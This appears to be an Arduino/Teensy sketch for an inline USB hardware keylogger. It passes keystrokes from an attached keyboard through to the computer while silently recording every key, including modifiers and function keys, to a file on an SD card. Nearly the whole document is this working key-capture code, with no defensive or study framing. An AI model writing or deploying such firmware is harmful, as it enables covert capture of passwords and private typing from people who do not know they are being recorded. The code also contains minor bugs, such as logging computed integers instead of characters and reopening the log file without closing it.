#include <USBHost_t36.h>
#include <SD.h>


//Note: I modified the keyboard.cpp file in /USBHost_t36/keyboard.cpp
//I commented out lines 256, 265, 275, and 283 
//Those lines seem to not detect if the function is called, so I jerry rigged a solution for it

#define DEBUG

File dataLog;

USBHost usb;
KeyboardController keyboard1(usb);


/* Problems:
 * Locks dont do anything
 *    scroll lock triggers the right LED, but triggers Caps Lock
 */

const int chipSelect = BUILTIN_SDCARD;

void setup(){
  #ifdef DEBUG
    while (!Serial) ; // wait for Arduino Serial Monitor
    Serial.begin(9600);
  #endif
  
  usb.begin();
  // Since modifier keys arent picked up with the regular functions, Ill use a modified version here
  keyboard1.attachRawPress(OnRawPress);
  keyboard1.attachRawRelease(OnRawRelease);
  if (!SD.begin(chipSelect)) return; //restart until SD card found
  dataLog = SD.open("datalog.txt", FILE_WRITE);
}

void loop() {
  usb.Task();
}

void OnRawPress(uint8_t key){
  #ifdef DEBUG
  Serial.println("Raw-------------------\nKey: " + String(key) + "\n----------------------");
  #endif
  dataLog = SD.open("datalog.txt", FILE_WRITE); //log keystroke to SD card
  switch(key){
    //1,2, and 3 dont seem to be defined
    case 4 ... 29:   Keyboard.press((char)(key + 93));  dataLog.print((char)key+93);  break; //letters (a:4, z:29)
    case 30 ... 38:   Keyboard.press((char)(key + 19));  dataLog.print((char)key+19); break; //numbers (1:30 0:39)
    case 39:  Keyboard.press(KEY_0);                    dataLog.print("0");           break; //Since ASCII starts with 0 and arduino ends in 0
    case 40:  Keyboard.press(KEY_ENTER);                dataLog.print("「Enter」");   break;
    case 41:  Keyboard.press(KEY_ESC);                  dataLog.print("「Esc」");     break;
    case 42:  Keyboard.press(KEY_BACKSPACE);            dataLog.print("「Bksp」");     break;
    case 43:  Keyboard.press(KEY_TAB);                  dataLog.print("「Tab」");     break;
    case 44:  Keyboard.press(KEY_SPACE);                dataLog.print(" ");           break;
    case 45:  Keyboard.press(KEY_MINUS);                dataLog.print("-");           break;
    case 46:  Keyboard.press(KEY_EQUAL);                dataLog.print("=");           break;
    case 47:  Keyboard.press(KEY_LEFT_BRACE);           dataLog.print("[");           break; 
    case 48:  Keyboard.press(KEY_RIGHT_BRACE);          dataLog.print("]");           break; 
    case 49:  Keyboard.press(KEY_BACKSLASH);            dataLog.print("\\");          break; 
    case 50:  Keyboard.press(KEY_NON_US_NUM);           dataLog.print("「NmLck」");   break; 
    case 51:  Keyboard.press(KEY_SEMICOLON);            dataLog.print(";");           break; 
    case 52:  Keyboard.press(KEY_QUOTE);                dataLog.print("\"");          break;
    case 53:  Keyboard.press(KEY_TILDE);                dataLog.print("`");           break;
    case 54:  Keyboard.press(KEY_COMMA);                dataLog.print(",");           break;
    case 55:  Keyboard.press(KEY_PERIOD);               dataLog.print(".");           break;
    case 56:  Keyboard.press(KEY_SLASH);                dataLog.print("/");           break;
    case 57:                                            dataLog.print("「CpsLck」");  break; 
    case 58:  Keyboard.press(KEY_F1);                   dataLog.print("「F1」");      break;
    case 59:  Keyboard.press(KEY_F2);                   dataLog.print("「F2」");      break;
    case 60:  Keyboard.press(KEY_F3);                   dataLog.print("「F3」");      break;
    case 61:  Keyboard.press(KEY_F4);                   dataLog.print("「F4」");      break;
    case 62:  Keyboard.press(KEY_F5);                   dataLog.print("「F5」");      break;
    case 63:  Keyboard.press(KEY_F6);                   dataLog.print("「F6」");      break;
    case 64:  Keyboard.press(KEY_F7);                   dataLog.print("「F7」");      break;
    case 65:  Keyboard.press(KEY_F8);                   dataLog.print("「F8」");      break;
    case 66:  Keyboard.press(KEY_F9);                   dataLog.print("「F9」");      break;
    case 67:  Keyboard.press(KEY_F10);                  dataLog.print("「F10」");      break;
    case 68:  Keyboard.press(KEY_F11);                  dataLog.print("「F11」");      break;
    case 69:  Keyboard.press(KEY_F12);                  dataLog.print("「F12」");      break;
    case 70:  Keyboard.press(KEY_PRINTSCREEN);          dataLog.print("「PrtScn」");  break;
    case 71:  Keyboard.press(KEY_SCROLL_LOCK);          dataLog.print("「ScrlLck」"); break; 
    case 72:  Keyboard.press(KEY_PAUSE);                dataLog.print("「Pause」");   break;
    case 73:  Keyboard.press(KEY_INSERT);               dataLog.print("「Ins」");     break;
    case 74:  Keyboard.press(KEY_HOME);                 dataLog.print("「Home」");    break;
    case 75:  Keyboard.press(KEY_PAGE_UP);              dataLog.print("「Pg↑」");     break;
    case 76:  Keyboard.press(KEY_DELETE);               dataLog.print("「Del」");     break;
    case 77:  Keyboard.press(KEY_END);                  dataLog.print("「End」");     break;
    case 78:  Keyboard.press(KEY_PAGE_DOWN);            dataLog.print("「Pg↓」");     break;
    case 79:  Keyboard.press(KEY_RIGHT);                dataLog.print("→");          break;
    case 80:  Keyboard.press(KEY_LEFT);                 dataLog.print("←");          break;
    case 81:  Keyboard.press(KEY_DOWN);                 dataLog.print("↓");          break;
    case 82:  Keyboard.press(KEY_UP);                   dataLog.print("↑");          break;
    case 83:  Keyboard.press(KEY_NUM_LOCK);             dataLog.print("「NmLck」");   break; 
    case 84:  Keyboard.press(KEYPAD_SLASH);             dataLog.print("/");           break;
    case 85:  Keyboard.press(KEYPAD_ASTERIX);           dataLog.print("*");           break;
    case 86:  Keyboard.press(KEYPAD_MINUS);             dataLog.print("-");           break;
    case 87:  Keyboard.press(KEYPAD_PLUS);              dataLog.print("+");           break;
    case 88:  Keyboard.press(KEYPAD_ENTER);             dataLog.print("「Enter」");   break;
    case 89:  Keyboard.press(KEYPAD_1);                 dataLog.print("1");           break;
    case 90:  Keyboard.press(KEYPAD_2);                 dataLog.print("2");           break;
    case 91:  Keyboard.press(KEYPAD_3);                 dataLog.print("3");           break;
    case 92:  Keyboard.press(KEYPAD_4);                 dataLog.print("4");           break;
    case 93:  Keyboard.press(KEYPAD_5);                 dataLog.print("5");           break;
    case 94:  Keyboard.press(KEYPAD_6);                 dataLog.print("6");           break;
    case 95:  Keyboard.press(KEYPAD_7);                 dataLog.print("7");           break;
    case 96:  Keyboard.press(KEYPAD_8);                 dataLog.print("8");           break;
    case 97:  Keyboard.press(KEYPAD_9);                 dataLog.print("9");           break;
    case 98:  Keyboard.press(KEYPAD_0);                 dataLog.print("0");           break;
    case 99:  Keyboard.press(KEYPAD_PERIOD);            dataLog.print(".");           break;
    case 100: Keyboard.press(KEY_NON_US_BS);            dataLog.print("「NonUSBS]");  break; //no idea what this is
    case 101: Keyboard.press(KEY_MENU);                 dataLog.print("「↓Menu」");   break;
    //102?
    case 103: Keyboard.press(MODIFIERKEY_CTRL);         dataLog.print("「↓LCtrl」");  break;
    case 104: Keyboard.press(MODIFIERKEY_SHIFT);        dataLog.print("「↓LSft」");   break;
    case 105: Keyboard.press(MODIFIERKEY_ALT);          dataLog.print("「↓LAlt」");   break;
    case 106: Keyboard.press(MODIFIERKEY_GUI);          dataLog.print("「↓GUI」");    break;
    case 107: Keyboard.press(MODIFIERKEY_RIGHT_CTRL);   dataLog.print("「↓RCtrl」");  break;
    case 108: Keyboard.press(MODIFIERKEY_RIGHT_SHIFT);  dataLog.print("「↓RShift」"); break;
    case 109: Keyboard.press(MODIFIERKEY_RIGHT_ALT);    dataLog.print("「↓RAlt」");   break;
    //I think this is all
    default:
      #ifdef DEBUG
      Serial.println("Unknown key: " + String(key));
      #endif
      break;
  }
 }
void OnRawRelease(uint8_t key){
  dataLog = SD.open("datalog.txt", FILE_WRITE); //log keystroke to SD card
  switch(key){
    //1,2, and 3 dont seem to be defined
    case 4 ... 29:   Keyboard.release((char)(key + 93));  break; //letters (a:4, z:29)
    case 30 ... 38:  Keyboard.release((char)(key + 19));  break; //numbers (1:30 0:39)
    case 39:  Keyboard.release(KEY_0);                    break; //Since ASCII starts with 0 and arduino ends in 0
    case 40:  Keyboard.release(KEY_ENTER);                break;
    case 41:  Keyboard.release(KEY_ESC);                  break;
    case 42:  Keyboard.release(KEY_BACKSPACE);            break;
    case 43:  Keyboard.release(KEY_TAB);                  break;
    case 44:  Keyboard.release(KEY_SPACE);                break;
    case 45:  Keyboard.release(KEY_MINUS);                break;
    case 46:  Keyboard.release(KEY_EQUAL);                break;
    case 47:  Keyboard.release(KEY_LEFT_BRACE);           break; 
    case 48:  Keyboard.release(KEY_RIGHT_BRACE);          break; 
    case 49:  Keyboard.release(KEY_BACKSLASH);            break; 
    case 50:  Keyboard.release(KEY_NON_US_NUM);           break; 
    case 51:  Keyboard.release(KEY_SEMICOLON);            break; 
    case 52:  Keyboard.release(KEY_QUOTE);                break;
    case 53:  Keyboard.release(KEY_TILDE);                break;
    case 54:  Keyboard.release(KEY_COMMA);                break;
    case 55:  Keyboard.release(KEY_PERIOD);               break;
    case 56:  Keyboard.release(KEY_SLASH);                break;
    case 57:                                              break; 
    case 58:  Keyboard.release(KEY_F1);                   break;
    case 59:  Keyboard.release(KEY_F2);                   break;
    case 60:  Keyboard.release(KEY_F3);                   break;
    case 61:  Keyboard.release(KEY_F4);                   break;
    case 62:  Keyboard.release(KEY_F5);                   break;
    case 63:  Keyboard.release(KEY_F6);                   break;
    case 64:  Keyboard.release(KEY_F7);                   break;
    case 65:  Keyboard.release(KEY_F8);                   break;
    case 66:  Keyboard.release(KEY_F9);                   break;
    case 67:  Keyboard.release(KEY_F10);                  break;
    case 68:  Keyboard.release(KEY_F11);                  break;
    case 69:  Keyboard.release(KEY_F12);                  break;
    case 70:  Keyboard.release(KEY_PRINTSCREEN);          break;
    case 71:  Keyboard.release(KEY_SCROLL_LOCK);          break; 
    case 72:  Keyboard.release(KEY_PAUSE);                break;
    case 73:  Keyboard.release(KEY_INSERT);               break;
    case 74:  Keyboard.release(KEY_HOME);                 break;
    case 75:  Keyboard.release(KEY_PAGE_UP);              break;
    case 76:  Keyboard.release(KEY_DELETE);               break;
    case 77:  Keyboard.release(KEY_END);                  break;
    case 78:  Keyboard.release(KEY_PAGE_DOWN);            break;
    case 79:  Keyboard.release(KEY_RIGHT);                break;
    case 80:  Keyboard.release(KEY_LEFT);                 break;
    case 81:  Keyboard.release(KEY_DOWN);                 break;
    case 82:  Keyboard.release(KEY_UP);                   break;
    case 83:  Keyboard.release(KEY_NUM_LOCK);             break; 
    case 84:  Keyboard.release(KEYPAD_SLASH);             break;
    case 85:  Keyboard.release(KEYPAD_ASTERIX);           break;
    case 86:  Keyboard.release(KEYPAD_MINUS);             break;
    case 87:  Keyboard.release(KEYPAD_PLUS);              break;
    case 88:  Keyboard.release(KEYPAD_ENTER);             break;
    case 89:  Keyboard.release(KEYPAD_1);                 break;
    case 90:  Keyboard.release(KEYPAD_2);                 break;
    case 91:  Keyboard.release(KEYPAD_3);                 break;
    case 92:  Keyboard.release(KEYPAD_4);                 break;
    case 93:  Keyboard.release(KEYPAD_5);                 break;
    case 94:  Keyboard.release(KEYPAD_6);                 break;
    case 95:  Keyboard.release(KEYPAD_7);                 break;
    case 96:  Keyboard.release(KEYPAD_8);                 break;
    case 97:  Keyboard.release(KEYPAD_9);                 break;
    case 98:  Keyboard.release(KEYPAD_0);                 break;
    case 99:  Keyboard.release(KEYPAD_PERIOD);            break;
    case 100: Keyboard.release(KEY_NON_US_BS);            break; //no idea what this is
    case 101: Keyboard.release(KEY_MENU);                 dataLog.print("「↓Menu」");   break;
    //102?
    case 103: Keyboard.release(MODIFIERKEY_CTRL);         dataLog.print("「↑LCtrl」");  break;
    case 104: Keyboard.release(MODIFIERKEY_SHIFT);        dataLog.print("「↑LSft」");   break;
    case 105: Keyboard.release(MODIFIERKEY_ALT);          dataLog.print("「↑LAlt」");   break;
    case 106: Keyboard.release(MODIFIERKEY_GUI);          dataLog.print("「↑GUI」");    break;
    case 107: Keyboard.release(MODIFIERKEY_RIGHT_CTRL);   dataLog.print("「↑RCtrl」");  break;
    case 108: Keyboard.release(MODIFIERKEY_RIGHT_SHIFT);  dataLog.print("「↑RShift」"); break;
    case 109: Keyboard.release(MODIFIERKEY_RIGHT_ALT);    dataLog.print("「↑RAlt」");   break;
    //I think this is all
  }
}
